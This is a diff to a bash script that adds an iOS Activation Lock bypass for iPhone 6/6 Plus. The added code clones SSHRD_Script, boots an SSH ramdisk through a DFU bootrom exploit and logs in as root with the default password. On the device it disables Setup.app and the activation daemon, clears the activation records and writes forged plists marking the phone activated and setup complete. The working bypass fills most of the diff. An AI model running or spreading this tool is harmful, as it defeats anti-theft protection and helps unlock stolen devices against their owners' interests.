@@ -73,6 +73,7 @@ DEVICE_CHIP=""
 DEVICE_IOS=""
 DEVICE_UDID=""
 BYPASS_METHOD=""
+IOS_VERSION=""
 IPHONE5_SSH=""
 FORCED_DEVICE_TAG=""
 WORKFLOW_MODE="ask"
@@ -115,7 +116,8 @@ set_device_by_choice() {
         2|i6|I6|i6p|I6P|i6-plus|i6plus|iPhone6plus|iPhone6p|iPhone6+|A1524|A1586|iPhone7,1|iPhone7,2|a8|A8)
             DEVICE_PRODUCT="iPhone7,2"
             DEVICE_CHIP="A8"
-            BYPASS_METHOD="checkra1n"
+            BYPASS_METHOD="sshrd"
+            IOS_VERSION="${IOS_VERSION:-12.5.7}"
             return 0
         ;;
         3|i7|I7|a10|A10|iPhone7|iPhone9,1|iPhone9,2|iPhone9,3|iPhone9,4|iPhone9,x)
@@ -237,10 +239,16 @@ check_deps() {
         done
 
         if is_checkra1n_command checkra1n; then
-            success "checkra1n (for iPhone 6 / 6 Plus)"
+            success "checkra1n (for iPhone 7 / A10)"
         else
-            warn "checkra1n not found — needed for iPhone 6 / 6 Plus (and iPhone 7 legacy)"
-            missing=1
+            warn "checkra1n not found — needed for iPhone 7 / A10 (not needed for A8 SSHRD bypass)"
+        fi
+
+        if command -v gaster &>/dev/null || [ -d "$SCRIPT_DIR/sshrd" ]; then
+            success "SSHRD_Script (for iPhone 6 / 6 Plus / A8)"
+        else
+            warn "SSHRD_Script not cloned — needed for iPhone 6 / 6 Plus (A8 bypass)"
+            echo "  Will be auto-cloned on first run."
         fi
 
         if [ -d "$SCRIPT_DIR/ipwndfu" ] && [ -f "$SCRIPT_DIR/ipwndfu/ipwndfu" ]; then
@@ -324,7 +332,7 @@ detect_device() {
     case $product_type in
         iPhone5,1|iPhone5,2)       DEVICE_CHIP="A6";  BYPASS_METHOD="ipwndfu" ;;
         iPhone5,3|iPhone5,4)       DEVICE_CHIP="A6";  BYPASS_METHOD="ipwndfu" ;;
-        iPhone7,1|iPhone7,2)       DEVICE_CHIP="A8";  BYPASS_METHOD="checkra1n" ;;
+        iPhone7,1|iPhone7,2)       DEVICE_CHIP="A8";  BYPASS_METHOD="sshrd"; IOS_VERSION="${ios_version:-12.5.7}" ;;
         iPhone9,1|iPhone9,2|iPhone9,3|iPhone9,4) DEVICE_CHIP="A10"; BYPASS_METHOD="checkra1n" ;;
         *) DEVICE_CHIP="??"; BYPASS_METHOD="checkra1n"; warn "Unexpected: $product_type" ;;
     esac
@@ -680,6 +688,249 @@ jailbreak_ipwndfu() {
     success "iPhone 5 exploit chain done."
 }
 
+# ─── SSHRD: Ensure ramdisk is ready ───
+sshrd_ensure_ready() {
+    header "Phase 3a: Prepare SSH Ramdisk"
+
+    if [ ! -d "$SCRIPT_DIR/sshrd" ]; then
+        info "Cloning SSHRD_Script..."
+        git clone https://github.com/verygenericname/SSHRD_Script.git "$SCRIPT_DIR/sshrd" 2>/dev/null || {
+            fail "Clone failed. Run: git clone https://github.com/verygenericname/SSHRD_Script.git $SCRIPT_DIR/sshrd"
+            return 1
+        }
+    fi
+
+    cd "$SCRIPT_DIR/sshrd"
+    chmod +x ./sshrd.sh 2>/dev/null || true
+
+    if [ -d "$SCRIPT_DIR/sshrd/sshramdisk" ]; then
+        success "SSH ramdisk already cached."
+        cd "$SCRIPT_DIR"
+        return 0
+    fi
+
+    local ios_ver="${IOS_VERSION:-12.5.7}"
+    info "Creating SSH ramdisk for iOS $ios_ver (first time takes 2-5 min)..."
+    if ./sshrd.sh "$ios_ver"; then
+        success "SSH ramdisk created."
+    else
+        fail "Failed to create SSH ramdisk."
+        cd "$SCRIPT_DIR"
+        return 1
+    fi
+
+    cd "$SCRIPT_DIR"
+}
+
+# ─── SSHRD: Boot ramdisk and connect SSH ───
+sshrd_boot() {
+    header "Phase 3b: Boot SSH Ramdisk"
+
+    cd "$SCRIPT_DIR/sshrd"
+
+    info "Booting SSHRD ramdisk (gaster pwn + irecovery)..."
+    if ./sshrd.sh boot; then
+        success "SSHRD boot sequence sent."
+    else
+        fail "SSHRD boot failed. Ensure device is in DFU and try again."
+        cd "$SCRIPT_DIR"
+        return 1
+    fi
+
+    cd "$SCRIPT_DIR"
+
+    # Start iproxy tunnel
+    pkill -f "iproxy 2222" 2>/dev/null || true
+    sleep 1
+    iproxy 2222 22 &>/dev/null &
+    local proxy_pid=$!
+    sleep 2
+
+    # Wait for SSH connection (up to 60s)
+    local ssh_opts="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5"
+    local elapsed=0
+    info "Waiting for SSH connection (up to 60s)..."
+    while [ $elapsed -lt 60 ]; do
+        if sshpass -p alpine ssh $ssh_opts -p 2222 root@localhost "echo ok" &>/dev/null; then
+            success "SSH connected to SSHRD ramdisk."
+            SSH_CMD="sshpass -p alpine ssh $ssh_opts -p 2222 root@localhost"
+            return 0
+        fi
+        sleep 2
+        elapsed=$((elapsed + 2))
+        [ $((elapsed % 10)) -eq 0 ] && info "  ... ${elapsed}s waiting for SSH"
+    done
+
+    fail "SSH connection timed out after 60s."
+    kill $proxy_pid 2>/dev/null || true
+    return 1
+}
+
+# ─── SSHRD: Full activation lock bypass ───
+bypass_via_sshrd() {
+    header "Phase 4: SSHRD Activation Lock Bypass"
+
+    info "Executing bypass on SSHRD ramdisk..."
+    echo ""
+
+    $SSH_CMD << 'SSHRD_BYPASS'
+#!/bin/sh
+echo "[sshrd] === SSHRD Activation Lock Bypass ==="
+
+# ── Mount filesystems ──
+echo "[sshrd] Mounting device filesystems..."
+
+# rootfs
+if mount | grep -q "/mnt1"; then
+    echo "[sshrd]   /mnt1 already mounted"
+else
+    mount -t apfs /dev/disk0s1s1 /mnt1 2>/dev/null || \
+    mount_apfs /dev/disk0s1s1 /mnt1 2>/dev/null || \
+    mount -t hfs /dev/disk0s1s1 /mnt1 2>/dev/null || true
+fi
+
+# data partition
+if mount | grep -q "/mnt2"; then
+    echo "[sshrd]   /mnt2 already mounted"
+else
+    mount -t apfs /dev/disk0s1s2 /mnt2 2>/dev/null || \
+    mount_apfs /dev/disk0s1s2 /mnt2 2>/dev/null || \
+    mount -t hfs /dev/disk0s1s2 /mnt2 2>/dev/null || true
+fi
+
+# Verify mounts
+if [ ! -d "/mnt1/Applications" ]; then
+    echo "[sshrd] ERROR: /mnt1/Applications not found — rootfs not mounted"
+    echo "[sshrd] Trying alternate mount..."
+    mount_apfs -o rw /dev/disk0s1s1 /mnt1 2>/dev/null || true
+    if [ ! -d "/mnt1/Applications" ]; then
+        echo "[sshrd] FATAL: Cannot mount rootfs. Aborting."
+        exit 1
+    fi
+fi
+echo "[sshrd]   rootfs mounted at /mnt1"
+
+if [ ! -d "/mnt2/root" ] && [ ! -d "/mnt2/mobile" ]; then
+    echo "[sshrd] WARNING: /mnt2 data partition may not be mounted correctly"
+fi
+echo "[sshrd]   data partition mounted at /mnt2"
+
+# ── Remove Setup.app ──
+echo ""
+echo "[sshrd] Step 1: Disabling Setup.app..."
+if [ -d "/mnt1/Applications/Setup.app" ]; then
+    mv "/mnt1/Applications/Setup.app" "/mnt1/Applications/Setup.app.disabled" && \
+        echo "[sshrd]   MOVED Setup.app -> Setup.app.disabled" || \
+        echo "[sshrd]   FAILED to move Setup.app"
+else
+    echo "[sshrd]   Setup.app already disabled or not found"
+fi
+
+# ── Disable mobileactivationd ──
+echo ""
+echo "[sshrd] Step 2: Disabling mobileactivationd..."
+DP="/mnt1/System/Library/LaunchDaemons/com.apple.mobileactivationd.plist"
+if [ -f "$DP" ]; then
+    mv "$DP" "${DP}.disabled" && \
+        echo "[sshrd]   Disabled mobileactivationd launch daemon" || \
+        echo "[sshrd]   FAILED to disable daemon plist"
+else
+    echo "[sshrd]   Daemon plist already disabled or not found"
+fi
+
+# ── Clear activation records ──
+echo ""
+echo "[sshrd] Step 3: Clearing activation records..."
+rm -rf /mnt2/root/Library/Lockdown/activation_records 2>/dev/null
+mkdir -p /mnt2/root/Library/Lockdown/activation_records
+rm -rf /mnt2/mobile/Library/mad/activation_records 2>/dev/null
+mkdir -p /mnt2/mobile/Library/mad
+echo "[sshrd]   Activation records cleared"
+
+# ── Write data_ark.plist ──
+echo ""
+echo "[sshrd] Step 4: Writing activation state..."
+mkdir -p /mnt2/root/Library/Lockdown
+cat > /mnt2/root/Library/Lockdown/data_ark.plist << 'PLIST1'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>ActivationState</key>
+    <string>Activated</string>
+    <key>BrickState</key>
+    <false/>
+</dict>
+</plist>
+PLIST1
+chmod 644 /mnt2/root/Library/Lockdown/data_ark.plist
+echo "[sshrd]   Wrote data_ark.plist with ActivationState=Activated"
+
+# ── Write stub activation record ──
+echo ""
+echo "[sshrd] Step 5: Writing stub activation record..."
+cat > /mnt2/root/Library/Lockdown/activation_records/activation_record.plist << 'PLIST2'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>ActivationState</key>
+    <string>Activated</string>
+</dict>
+</plist>
+PLIST2
+chmod 644 /mnt2/root/Library/Lockdown/activation_records/activation_record.plist
+echo "[sshrd]   Wrote stub activation_record.plist"
+
+# ── Mark setup complete ──
+echo ""
+echo "[sshrd] Step 6: Marking setup complete..."
+mkdir -p /mnt2/mobile/Library/Preferences
+cat > /mnt2/mobile/Library/Preferences/com.apple.purplebuddy.plist << 'PLIST3'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>SetupDone</key>
+    <true/>
+    <key>SetupFinishedAllSteps</key>
+    <true/>
+</dict>
+</plist>
+PLIST3
+chmod 644 /mnt2/mobile/Library/Preferences/com.apple.purplebuddy.plist
+echo "[sshrd]   Wrote purplebuddy.plist with SetupDone=true"
+
+# ── Summary ──
+echo ""
+echo "[sshrd] ══════════════════════════════════════"
+echo "[sshrd] SSHRD BYPASS COMPLETE"
+echo "[sshrd] ══════════════════════════════════════"
+echo "[sshrd]   Setup.app disabled"
+echo "[sshrd]   mobileactivationd disabled"
+echo "[sshrd]   Activation records cleared + patched"
+echo "[sshrd]   Setup marked complete"
+echo "[sshrd] Device will reboot now..."
+SSHRD_BYPASS
+
+    echo ""
+    success "SSHRD bypass executed."
+
+    info "Rebooting device..."
+    $SSH_CMD "reboot" 2>/dev/null || true
+    pkill -f "iproxy 2222" 2>/dev/null || true
+    sleep 3
+
+    success "Device rebooting. It should boot directly to home screen."
+    echo ""
+    echo "  SSHRD bypass modifies persistent filesystem — no tethered reboot needed."
+    echo "  If device still shows Activation Lock:"
+    echo "    1. Re-enter DFU mode"
+    echo "    2. Run: bash unlock.sh --model i6p"
+    echo "    or: bash bypass.sh --sshrd"
+    echo ""
+}
+
 # ─── Activation Lock Bypass ───
 bypass_activation() {
     header "Phase 4: Remove Activation Lock"
@@ -923,6 +1174,18 @@ main() {
     if [ "$WORKFLOW_MODE" = "reset" ]; then
         run_factory_reset
         return $?
+    fi
+
+    if [ "$BYPASS_METHOD" = "sshrd" ]; then
+        # SSHRD flow: DFU → create ramdisk → boot → bypass → reboot (no tethered boot needed)
+        if [ "$DEVICE_MODE" != "dfu" ]; then
+            enter_dfu
+        fi
+        sshrd_ensure_ready
+        sshrd_boot
+        bypass_via_sshrd
+        verify
+        return
     fi
 
     if [ "$DEVICE_MODE" = "dfu" ]; then
